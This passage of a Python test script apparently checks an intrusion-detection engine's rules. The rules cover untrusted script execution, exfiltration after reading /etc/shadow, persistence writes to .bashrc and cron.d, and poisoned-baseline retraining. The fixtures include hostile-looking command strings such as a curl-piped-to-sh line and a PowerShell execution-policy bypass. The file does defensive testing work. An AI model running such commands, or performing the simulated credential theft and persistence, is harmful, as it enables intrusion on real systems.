h_on = eng6(script_exec=True, socket_io=True).process(win(dl_edges), r6)
check("untrusted_exec" not in h_off and "untrusted_code_network" not in h_off,
      f"before 0.6: a downloaded script run by a known interpreter raises no alarm ({sorted(h_off)})")
check({x.rule for x in h_on} >= {"untrusted_exec", "untrusted_code_network"} and any(x.key == "/tmp/x.py" for x in h_on if x.rule == "untrusted_exec"),
      f"script_exec + socket_io: download over a socket read, run by python3 -> untrusted_exec on the script, then C2 ({sorted({x.rule for x in h_on})})")
h_c = eng6(script_exec=True).process(win([(J["script"], "READ", J["pyc"], 1)]), r6)
check(h_c == [], "script_exec: inline code (python3 -c) has no script; reading a file is just a read")
for lab, want in [("python3 -m http.server", ""), ("bash -c 'curl x | sh'", ""), ("python3 -u /tmp/a.py arg", "/tmp/a.py"),
                  ("powershell.exe -ExecutionPolicy Bypass -File C:\\x\\a.ps1", "C:\\x\\a.ps1"), ("cscript //nologo run.vbs", "run.vbs"),
                  ("java -cp lib -jar /opt/app.jar", "/opt/app.jar"), ("perl -I lib script.pl", "script.pl")]:
    rr = Registry(); exe = "/usr/bin/" + lab.split()[0]
    n = rr.add(Entity.process("p:" + lab, exe, lab))
    got = eng6(script_exec=True)._script_of(rr, n)
    check(got == want, f"script argument of '{lab}': {got!r}")
check(TagEngine._same_file("/home/u/run.vbs", "run.vbs") and TagEngine._same_file("/tmp/a.py", "./a.py") and not TagEngine._same_file("/tmp/b.py", "a.py"),
      "script path matching: relative script names match the opened file's tail")

ex_edges = [(J["shadow"], "READ", J["cat"], 1), (J["cat"], "WRITE", J["c2"], 2)]
check(not any(x.rule == "exfiltration" for x in eng6().process(win(ex_edges), r6))
      and any(x.rule == "exfiltration" for x in eng6(socket_io=True).process(win(ex_edges), r6)),
      "socket_io: write() on a connected socket after reading /etc/shadow is exfiltration")
pe = [(J["c2"], "RECVFROM", J["dl"], 1), (J["dl"], "WRITE", J["bashrc"], 2), (J["dl"], "WRITE", J["cron"], 3), (J["dl"], "WRITE", J["other"], 4)]
hp = [x for x in eng6(persistence=True).process(win(pe), r6) if x.rule == "untrusted_persistence"]
check([x.nodes[1] for x in hp] == [J["bashrc"]] and not any(x.rule == "untrusted_persistence" for x in eng6().process(win(pe), r6)),
      "persistence: a process holding untrusted data writing .bashrc alarms (once per process, like every rule)")
hp2 = [x for x in eng6(persistence=True).process(win([(J["c2"], "RECVFROM", J["dl"], 1), (J["dl"], "WRITE", J["other"], 2), (J["dl"], "WRITE", J["cron"], 3)]), r6)
       if x.rule == "untrusted_persistence"]
check([x.nodes[1] for x in hp2] == [J["cron"]] and hp2[0].key == "/usr/bin/curl @ /etc/cron.d", f"persistence: cron.d, key program @ directory ({[x.key for x in hp2]})")
# live collectors: connect() is traced, read() on the socket is not - the download must still taint
cr = [(J["dl"], "CONNECT", J["c2"], 1), (J["dl"], "WRITE", J["script"], 2), (J["script"], "EXECUTE", J["py"], 3)]
check(not any(x.rule == "untrusted_exec" for x in eng6().process(win(cr), r6))
      and any(x.rule == "untrusted_exec" for x in eng6(connect_receives=True).process(win(cr), r6)),
      "connect_receives: a file written after connecting to an untrusted address is untrusted content (download via read())")
le = [(J["cat"], "CONNECT", J["c2"], 1), (J["shadow"], "READ", J["cat"], 2)]
check(not any(x.rule == "exfiltration" for x in eng6().process(win(le), r6))
      and [x.nodes for x in eng6(late_exfil=True).process(win(le), r6) if x.rule == "exfiltration"] == [(J["cat"], J["c2"])],
      "late_exfil: connect first, then read /etc/shadow -> exfiltration (the order no longer hides it)")
old_cap = LY.UNTRUSTED_FILES_CAP; LY.UNTRUSTED_FILES_CAP = 2
tc = eng6(image_exec=True)
rc = Registry(); pc = rc.add(Entity.process("p:w", "/usr/bin/w", "w")); nc = rc.add(Entity.socket("n:x", "203.0.113.1", 1))
fs = [rc.add(Entity.file(f"f:{k}", f"/tmp/f{k}")) for k in range(5)]
tc.process(win([(nc, "RECVFROM", pc, 0)] + [(pc, "WRITE", f, k + 1) for k, f in enumerate(fs)]), rc)
check(len(tc._untrusted_files) == 2 and "/tmp/f4" in tc._untrusted_files, "image_exec memory is bounded (oldest untrusted files forgotten first)")
LY.UNTRUSTED_FILES_CAP = old_cap

# benign keys relaxed only when they recur; exclusions from unreleased alerts; runtime trust = recurring addresses
days6 = {"d1": [win([(I["oneoff"], "RECVFROM", I["nginx"]), (I["nginx"], "CLONE", I["worker"]), (I["sh_file"], "EXECUTE", I["worker"])])],
         "d2": [win([(I["client"], "RECVFROM", I["nginx"])])], "d3": [win([(I["client"], "RECVFROM", I["worker"])])]}
c6 = LayerConfig(relax_min_days=2, recurring_trust=True)
sp0 = fit_layers(Store(days6), ["d1", "d2", "d3"], reg, N_PRE, c6, log=lambda m: None)
check("/usr/sbin/nginx -> /bin/sh" in sp0["thresholds"].get("tainted_spawn", {}) and set(sp0["trusted_ips"]) == {"10.0.0.5", "198.51.100.7"},
      "first fit (no previous model): one-day keys relax and every baseline address is trusted, as before 0.6")
sp1 = fit_layers(Store(days6), ["d1", "d2", "d3"], reg, N_PRE, c6, log=lambda m: None, prior={"thresholds": {}, "trusted_ips": []})
check("/usr/sbin/nginx -> /bin/sh" not in sp1["thresholds"].get("tainted_spawn", {}),
      "retrain, relax_min_days=2: a key new since the previous model that fired on one day only stays strict (one poisoned day is not enough)")
check(sp1["trusted_ips"] == ["10.0.0.5"], f"retrain, recurring_trust: a new address seen on one day is not trusted ({sp1['trusted_ips']})")
sp1b = fit_layers(Store(days6), ["d1", "d2", "d3"], reg, N_PRE, c6, log=lambda m: None,
                  prior={"thresholds": {"tainted_spawn": {"/usr/sbin/nginx -> /bin/sh": 0.1}}, "trusted_ips": ["198.51.100.7"]})
check("/usr/sbin/nginx -> /bin/sh" in sp1b["thresholds"].get("tainted_spawn", {}) and "198.51.100.7" in sp1b["trusted_ips"],
      "retrain: what the previous model already accepted stays accepted")
sp2 = fit_layers(Store(days6), ["d1", "d2", "d3"], reg, N_PRE, LayerConfig(),
                 exclude={"programs": ["/usr/sbin/nginx"], "addresses": ["198.51.100.7"], "rule_keys": [["tainted_spawn", "/usr/sbin/nginx -> /bin/sh"]]},
                 log=lambda m: None)
check(sp0["coverage"]["processes"] == 2 and sp0["coverage"]["processes_with_path"] == 2 and sp0["coverage"]["flows"] == 2
      and sp0["coverage"]["flows_with_address"] == 2 and sp0["coverage"]["exec_events"] == 1, f"fit records telemetry coverage ({sp0['coverage']})")
check(sp2["known_executables"] == [] and "198.51.100.7" not in sp2["trusted_ips"]
      and "/usr/sbin/nginx -> /bin/sh" not in sp2["thresholds"].get("tainted_spawn", {}) and sp2["excluded"] == {"programs": 1, "addresses": 1, "rule_keys": 1},
      f"exclude: what unreleased alerts point at does not become known / trusted / relaxed ({sp2.get('excluded')})")
from pdp_engine.scoring import fill_missing
fm = fill_missing(np.array([np.inf, -np.inf, np.nan, 2.0], dtype=np.float32))
check(fm[0] > 1e5 and fm[1] == 0 and fm[2] == 0 and fm[3] == 2, "fill_missing: an overflowing score ranks first, not last")

# ---------------------------------------------------------------- detector-1 structural input
try:
    import torch
    from pdp_engine.models import window_degrees
except ImportError as e:
    print(f"SKIP degree features ({e})")
else:
    s = torch.tensor([0, 0, 1, 0]); d = torch.tensor([1, 2, 2, 1])
    a, b = window_degrees(s, d)
    ra, rb = torch.expm1(a * 7).round(), torch.expm1(b * 7).round()
    check(ra[0].tolist() == [3, 0, 2, 0] and rb[2].tolist() == [0, 2, 0, 2], "window degrees: out/in degree and distinct successors/predecessors")

    # batch_scale must equal what PIDSMaker's GraphReindexer (fix_buggy_graph_reindexer: False) feeds Velox: a
    # scatter-mean of the source features, then a scatter-mean of the destination features into the same buffer
    # (torch_scatter's mean with `out`: sum into out, then divide by the destination count, clamped to 1)
    from pdp_engine.models import batch_role_scale, velox_window_inputs
    g = torch.Generator().manual_seed(0)
    n, E = 12, 300
    s = torch.randint(0, n, (E,), generator=g); d = torch.randint(0, n, (E,), generator=g)
    x = torch.rand((n, 5), generator=g)
    out = torch.zeros((n, 5))
    cs = torch.zeros(n).index_add_(0, s, torch.ones(E)).clamp(min=1)
    out.index_add_(0, s, x[s]); out /= cs[:, None]                       # first pass: mean over source edges
    cd = torch.zeros(n).index_add_(0, d, torch.ones(E)).clamp(min=1)
    out.index_add_(0, d, x[d]); out /= cd[:, None]                       # second pass into the same buffer
    fs, fd = batch_role_scale(s, d)
    check(torch.allclose(x[s] * fs[:, None], out[s], atol=1e-6) and torch.allclose(x[d] * fd[:, None], out[d], atol=1e-6),
          "batch_scale equals PIDSMaker's reindexed Velox input (double scatter-mean)")
    sl = torch.tensor([0, 1, 2]); dl = torch.tensor([1, 3, 1])           # node 1: source once, destination twice
    fs, fd = batch_role_scale(sl, dl)
    check(fs.tolist() == [1.0, 1.5, 1.0] and fd.tolist() == [1.5, 1.0, 1.5], "batch_scale: x(1 + 1/k) for nodes that send and receive")
    S = torch.arange(2500) % 40; Dd = (torch.arange(2500) * 7) % 40; xf = torch.rand((40, 3), generator=g)
    parts = list(velox_window_inputs(S, Dd, torch.zeros(2500, dtype=torch.long), lambda q: xf[q], "batch_scale"))
    b2s, _ = batch_role_scale(S[1024:2048], Dd[1024:2048])
    check([(a, b) for a, b, *_ in parts] == [(0, 1024), (1024, 2048), (2048, 2500)] and torch.allclose(parts[1][2], xf[S[1024:2048]] * b2s[:, None]),
          "velox_window_inputs: 1024-edge batches, scale computed per batch")
    from pdp_engine.bundle import check_requires, detector1_file
    from pdp_engine.trainer import average_top
    check(detector1_file("batch_scale", 2) == "detector-1-bs-s2.npz" and detector1_file("window_degrees", 0) == "detector-1-s0.npz",
          "batch_scale weights get a file name pre-0.5 runtimes do not load (they refuse the bundle instead of scoring it wrongly)")
    check_requires({"requires": ["detector-1:batch_scale"]}); check_requires({})
    try:
        check_requires({"requires": ["detector-9:future"]}); refused = False
    except ValueError:
        refused = True
    check(refused, "a bundle requiring an unknown runtime feature is refused")
    kept = [(0.7, {"w": torch.tensor([1.0])}), (0.5, {"w": torch.tensor([3.0])}), (0.6, {"w": torch.tensor([5.0])}), (0.9, {"w": torch.tensor([100.0])})]
    check(float(average_top(kept, 3)["w"]) == 3.0 and float(average_top(kept, 1)["w"]) == 3.0 and float(average_top(kept, 2)["w"]) == 4.0,
          "average_top: mean weights of the k lowest-validation-loss epochs")
    from pdp_engine.scoring import FusionCalibration
    r1v, r2v = np.array([0.2, 1.0, 0.5]), np.array([0.9, 0.1, 0.5])
    fm = FusionCalibration.from_validation(r1v, r2v, (2.0, 1.0), "max")
    fw = FusionCalibration.from_validation(r1v, r2v, (2.0, 1.0))
    check(fm.threshold == 1.0 and list(fm.fuse(np.array([3.0, 0.0]), np.array([0.0, 2.0]))) == [3.0, 2.0] and fw.mode == "weighted"
          and abs(fw.threshold - 0.7) < 1e-9, "fusion max: the more confident detector; weighted stays the 0.4 mean")
    from pdp_engine.bundle import requirements
    check(requirements("batch_scale", "max") == ["detector-1:batch_scale", "fusion:max"] and requirements("window_degrees", "weighted") == [],
          "0.5 bundles declare what they need; 0.4-style bundles declare nothing")

print("FAILURES:", fails)
sys.exit(1 if fails else 0)
